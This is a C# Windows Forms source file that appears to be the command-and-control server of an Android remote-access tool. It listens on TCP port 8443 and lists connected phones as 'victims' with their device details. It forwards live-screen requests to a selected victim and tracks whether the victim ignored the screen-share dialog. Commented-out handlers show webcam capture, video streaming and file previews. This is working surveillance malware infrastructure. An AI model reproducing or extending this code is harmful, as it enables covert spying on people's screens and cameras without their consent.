using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Hiatme_Server
{
    public partial class Form1 : Form
    {
        List<Client> client_list = new List<Client>();
        Socket oursocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        public static int port_no = 8443;
        public static string PASSWORD = string.Empty;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Start_Listener();
        }

        private void Start_Listener()
        {
            //port_no = 5000;
            //port_no = 8443;
            PASSWORD = "";
            Listen();
        }
        public void Listen()
        {
            try
            {
                oursocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                //soketimiz.NoDelay = true;
                oursocket.SendBufferSize = 524288; oursocket.ReceiveBufferSize = 524288;
                oursocket.SendTimeout = -1; oursocket.ReceiveTimeout = -1;
                oursocket.Bind(new IPEndPoint(IPAddress.Any, port_no));
                portlbl.Text = "Port: " + port_no.ToString();
                oursocket.Listen(int.MaxValue);
                oursocket.BeginAccept(new AsyncCallback(Client_Accept), null);
            }
            catch (Exception) { }
        }
        public void Client_Accept(IAsyncResult ar)
        {
            try
            {
                Socket sock = oursocket.EndAccept(ar);
                infoAl(sock);
                oursocket.BeginAccept(new AsyncCallback(Client_Accept), null);
            }
            catch (Exception) { }
        }
        public async void infoAl(Socket sckInf)
        {
            if (!sckInf.Connected)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                " couldn't connect."); return;
            }
            if (sckInf.Poll(-1, SelectMode.SelectRead) && sckInf.Available <= 0)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                " ghost connection: Poll");
                sckInf.Disconnect(false);
                sckInf.Close();
                sckInf.Dispose();
                return;
            }
            if (sckInf.Available == 0)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                " the socket is not ready: [ghost connection]");
                sckInf.Disconnect(false);
                sckInf.Close();
                sckInf.Dispose();
                return;
            }
            NetworkStream networkStream = new NetworkStream(sckInf);

            if (!networkStream.CanRead)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                    " networkstream couldn't read."); sckInf.Dispose(); return;
            }
            /*
            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + sckInf.Handle.ToString() +
                    " networkstream have started.");
            */
            StringBuilder sb = new StringBuilder();
            int thisRead = 0;
            int blockSize = 2048;
            byte[] dataByte = new byte[blockSize];
            while (true)
            {
                try
                {
                    thisRead = await networkStream.ReadAsync(dataByte, 0, blockSize);
                    sb.Append(Encoding.UTF8.GetString(dataByte, 0, thisRead));
                    while (sb.ToString().Trim().Contains($"<EOF{PASSWORD}>"))
                    {
                        string veri = sb.ToString().Substring(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf($"<EOF{PASSWORD}>") + $"<EOF{PASSWORD}>".Length);
                        DataInvoke(sckInf, veri.Replace($"<EOF{PASSWORD}>", ""));
                        sb.Remove(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf($"<EOF{PASSWORD}>") + $"<EOF{PASSWORD}>".Length);
                    }
                }
                catch (Exception)
                {
                    break;
                }
            }
        }
        private string ReturnClientListAsString()
        {
            try
            {
                var jsonString = string.Empty;

                if (client_list != null)
                {
                    jsonString = "[VERI]" + JsonConvert.SerializeObject(client_list);
                    return jsonString;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
            //StringBuilder sb = new StringBuilder();

            return null;
           
        }
        private Socket FindVictim(string victimid)
        {

            try
            {
                foreach(Client client in client_list)
                {
                    if(client.id == victimid)
                    {
                        return client.soket;
                    }
                }
            }catch (Exception e)
            {
                Console.WriteLine(e.ToString()); return null;
            }
            return null;
        }
        public void DataInvoke(Socket soket2, string data)
        {
            Invoke((MethodInvoker)delegate
            {
            string[] ayir = data.Split(new[] { "[0x09]" }, StringSplitOptions.None);
            foreach (string str in ayir)
            {
                string[] s = str.Split(new[] { "[VERI]" }, StringSplitOptions.None);
                try
                {
                        Console.WriteLine("Message Received: " + s[0]);
                    switch (s[0])
                    {
                        case "IP":

                                Add_Client(soket2, soket2.Handle.ToString(), s[1], s[2], s[3], s[4]);
                                //Console.WriteLine("connected");
                          
                            break;
                        case "REQCLIENTLIST":
                            CommandSend("RECCLIENTLIST", ReturnClientListAsString(), soket2);
                            break;
                        case "SCREENLIVEOPEN":
                            Invoke((MethodInvoker)delegate
                            {
                                listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + soket2.Handle.ToString() +
                                " is requeting live screen. => " + s[2]);
                            });
                                
                                CommandSend("SCREENLIVEOPEN", "[VERI][0x09]", FindVictim(s[2]));
                                break;



                            case "PrepareScreen":
                                
                                break;





                            case "LIVESCREEN":
                            /*
                            var canliekran = FindLiveScreenById(soket2.Handle.ToString());
                            if (canliekran != null)
                            {
                                canliekran.pictureBox1.Image = ((Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1])));
                            }
                            else
                            {
                                CommandSend("SCREENLIVECLOSE", "[VERI][0x09]", soket2);
                            }
                            */
                            break;
                        case "NOTSTART":
                                MessageBox.Show("Victim here", "Victim has ignored the screen share dialog.");
                            
                            break;
                        case "OLCULER":
                            /*
                            Invoke((MethodInvoker)delegate
                            {
                                if (s[1].Contains("Kameraya"))
                                {
                                    MessageBox.Show(this, s[1] + "\nThis error causes when camera is used by victim.", "Can't access to Camera", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                }
                                else
                                {
                                    if (FİndCameraById(soket2.Handle.ToString()) == null)
                                    {
                                        Kamera msj = new Kamera(soket2, soket2.Handle.ToString());
                                        msj.Text = "Camera Manager - " + FindVictim(soket2.Handle.ToString());
                                        msj.Show();
                                    }
                                    FİndCameraById(soket2.Handle.ToString()).comboBox1.Items.Clear();
                                    FİndCameraById(soket2.Handle.ToString()).comboBox2.Items.Clear();
                                    string[] front = s[1].Split('>');
                                    string[] _split = front[1].Split('<');
                                    FİndCameraById(soket2.Handle.ToString()).max = int.Parse(s[2].Split('}')[1]);
                                    FİndCameraById(soket2.Handle.ToString()).comboBox1.Items.AddRange(_split);
                                    _split = front[0].Split('<');
                                    FİndCameraById(soket2.Handle.ToString()).comboBox2.Items.AddRange(_split);
                                    var found = FİndCameraById(soket2.Handle.ToString());
                                    found.zoomSupport = Convert.ToBoolean(s[2].Split('}')[0]);

                                    string[] presize = s[3].Split('<'); found.comboBox4.Items.AddRange(presize);
                                    string[] cams = s[4].Split('!'); for (int p = 0; p < cams.Length; p++)
                                    {
                                        cams[p] = cams[p].Replace("0", "Back: 0").Replace("1", "Front: 1");
                                    }
                                    found.comboBox6.Items.AddRange(cams);
                                    found.comboBox6.SelectedIndex = 0;
                                    foreach (string str_ in found.comboBox1.Items)
                                    {
                                        if (int.Parse(str_.Split('x')[0]) < 800 && int.Parse(str_.Split('x')[0]) > 500)
                                        {
                                            found.comboBox1.SelectedItem = str_; break;
                                        }
                                    }
                                    foreach (string str_ in found.comboBox2.Items)
                                    {
                                        if (int.Parse(str_.Split('x')[0]) < 800 && int.Parse(str_.Split('x')[0]) > 500)
                                        {
                                            found.comboBox2.SelectedItem = str_; break;
                                        }
                                    }
                                    foreach (object str_ in found.comboBox4.Items)
                                    {
                                        if (str_.ToString().Contains("352"))
                                        {
                                            found.comboBox4.SelectedItem = str_;
                                        }
                                    }
                                    found.comboBox3.SelectedItem = "%70";
                                }
                            });
                            */
                            break;
                        case "PREVIEW":
                            /*
                            if (FindFileManagerById(soket2.Handle.ToString()) != null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    FindFileManagerById(soket2.Handle.ToString()).pictureBox1.Image =
                                       (Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1]));
                                    FindFileManagerById(soket2.Handle.ToString()).pictureBox1.Visible = true;
                                });
                            }
                            */
                            break;
                        case "VID":
                            /*
                            var shortcam = FİndCameraById(soket2.Handle.ToString());
                            try
                            {
                                if (shortcam != null)
                                {
                                    shortcam.pictureBox2.Image = RotateImage((Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1])));
                                    shortcam.label10.Text = "Fps: " + shortcam.CalculateFrameRate().ToString();
                                }
                            }
                            catch (Exception ex)
                            {
                                if (shortcam != null)
                                {
                                    FİndCameraById(soket2.Handle.ToString()).Text = ex.Message;
                                }
                            }
                            */
                            break;
                        case "WEBCAM":
                            /*
                            if (FİndCameraById(soket2.Handle.ToString()) != null)
                            {
                                try
                                {

                                    FİndCameraById(soket2.Handle.ToString()).label2.Text = "Captured.";
                                    byte[] resim = Convert.FromBase64String(s[1]);
                                    using (MemoryStream ms = new MemoryStream(resim))
                                    {
                                        FİndCameraById(soket2.Handle.ToString()).pictureBox1.Image = Image.FromStream(ms);
                                    }
                                    FİndCameraById(soket2.Handle.ToString()).button1.Enabled = true;
                                    ((System.Windows.Forms.Control)FİndCameraById(soket2.Handle.ToString()).tabPage2).Enabled = true;
                                }
                                catch (Exception ex)
                                {
                                    MessageBox.Show(FİndCameraById(soket2.Handle.ToString()), ex.Message, "Camera Manager - " + krbnIsminiBul(soket2.Handle.ToString()), MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                    FİndCameraById(soket2.Handle.ToString()).Text = "Camera Manager - " + krbnIsminiBul(soket2.Handle.ToString());
                                }
                            }
                            */
                            break;
                        case "CAMNOT":
                            /*
                            var fnd = FİndCameraById(soket2.Handle.ToString());
                            if (fnd != null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    if (s[1] == "")
                                    {
                                        FİndCameraById(soket2.Handle.ToString()).label2.Text = "Couldn't capture.";
                                    }
                                    FİndCameraById(soket2.Handle.ToString()).label1.Visible = true;
                                    FİndCameraById(soket2.Handle.ToString()).button1.Enabled = true;
                                    ((System.Windows.Forms.Control)fnd.tabPage1).Enabled = true; ///<--------- Changed from (Control)
                                    ((System.Windows.Forms.Control)fnd.tabPage2).Enabled = true;
                                    fnd.enabled = false;
                                    fnd.button4.Text = "Start";
                                    fnd.button4.Enabled = true;
                                });
                                if (s[1] != "" && s[1] != "vid")
                                {
                                    MessageBox.Show(fnd, s[1], "Warning - Camera Preview Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                }
                            }
                            */
                            break;

                    }
                }
                catch (Exception) { }
            }
            });
        }

        public static int topOf = 0;
        public async void Add_Client(Socket socket, string victim_id, string pc_name, string country_language, string manufacturer_model, string android_ver)
        {
            //socettte.NoDelay = true;
            //socettte.ReceiveBufferSize = int.MaxValue; socettte.SendBufferSize = int.MaxValue;
            client_list.Add(new Client(socket, victim_id, pc_name, country_language,manufacturer_model,android_ver));
            ListViewItem lvi = new ListViewItem(victim_id);
            lvi.SubItems.Add(pc_name);
            lvi.SubItems.Add(socket.RemoteEndPoint.ToString());
            lvi.SubItems.Add(country_language);
            lvi.SubItems.Add(manufacturer_model.ToUpper());
            lvi.SubItems.Add(android_ver);

            if (File.Exists(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + country_language.Split('/')[1].Replace("en", "england") + ".png"))
            {
                lvi.ImageKey = country_language.Split('/')[1].Replace("en", "england") + ".png";
            }
            else
            {
                lvi.ImageIndex = 0;
            }
            listView1.Items.Add(lvi);
            if (File.Exists(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + country_language.Split('/')[1].Replace("en", "england") + ".png"))
            {
                //new Bildiri(pc_name, manufacturer_model, android_ver,
                //Image.FromFile(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + country_language.Split('/')[1].Replace("en", "england") + ".png")).Show();
            }
            else
            {
                //new Bildiri(pc_name, manufacturer_model, android_ver, Image.FromFile(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\-1.png")).Show();
            }
            onlinecountlbl.Text = "Online: " + listView1.Items.Count.ToString();
            /*

            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + socket.Handle.ToString() +
                        " socket in list. => " + pc_name + "/" + socket.RemoteEndPoint.ToString());
            */
            await Task.Delay(1);
            topOf += 125;

        }

        public static async void CommandSend(string tag, string mesaj, Socket client)
        {
            try
            {
                using (NetworkStream ns = new NetworkStream(client))
                {
                    byte[] cmd = Encoding.UTF8.GetBytes("[0x09]" + tag + mesaj + "<EOF>");
                    await ns.WriteAsync(cmd, 0, cmd.Length);
                }
            }
            catch (Exception) { }
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            foreach (Client client in client_list.ToList())
            {

                try
                {
                    byte[] kntrl = Encoding.UTF8.GetBytes("[0x09]KNT[VERI][0x09]<EOF>");
                    client.soket.Send(kntrl, 0, kntrl.Length, SocketFlags.None);
                }
                catch (Exception)
                {
                    var victim = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == client.soket.Handle.ToString()).First();
                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + client.soket.Handle.ToString() + " connection of this socket has closed. => " + victim.SubItems[1].Text + "/" + victim.SubItems[2].Text);
                    victim.Remove();
                    client_list.Where(x => x.id == client.soket.Handle.ToString()).First().soket.Close();
                    client_list.Where(x => x.id == client.soket.Handle.ToString()).First().soket.Dispose();
                    client_list.Remove(client_list.Where(x => x.id == client.soket.Handle.ToString()).First());
                    onlinecountlbl.Text = "Online: " + listView1.SelectedItems.Count.ToString();
                }
            }
        }


























    }
}
